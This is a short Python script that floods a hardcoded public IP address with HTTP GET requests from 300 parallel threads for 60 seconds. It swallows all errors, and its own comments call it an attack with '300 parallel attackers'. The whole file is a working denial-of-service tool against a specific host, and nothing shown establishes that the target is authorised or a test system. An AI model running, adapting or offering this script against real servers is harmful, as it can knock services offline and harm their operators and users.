import requests
import threading
import time

TARGET = "http://13.235.23.114"
DURATION = 60  # seconds

def flood():
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            requests.get(TARGET, timeout=0.2)
        except:
            pass

threads = []

for _ in range(300):  # 300 parallel attackers
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Sustained attack simulation complete.")